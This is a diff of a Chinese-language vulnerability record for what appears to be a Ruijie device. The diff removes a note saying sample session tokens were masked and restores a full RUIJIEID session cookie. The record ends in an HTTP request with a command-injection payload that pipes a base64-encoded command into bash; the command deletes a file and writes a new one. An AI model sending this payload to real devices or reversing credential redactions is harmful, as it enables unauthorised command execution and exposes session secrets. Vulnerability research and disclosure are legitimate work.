@@ -39,7 +39,6 @@ source_status: "recorded"
 - 嵌套{{filename}}在base64字符串中是否展开未说明；固定HelloWorld可旧文件误报
 - 删除/写文件副作用，未清理；Bsae64笔误与fofa字段截断
 - 已落实的文本修订：“Bsae64”改为“Base64”；残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -92,7 +91,7 @@ User-Agent: Mozilla/5.0
 Connection: close
 Content-Length: 160
 Content-Type: application/x-www-form-urlencoded
-Cookie: RUIJIEID=e3t********************hu6;
+Cookie: RUIJIEID=e3t2n743strq8lu1anqod3bhu6;
 Accept-Encoding: gzip
 
 type=%7Cbash+-c+%27echo+cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
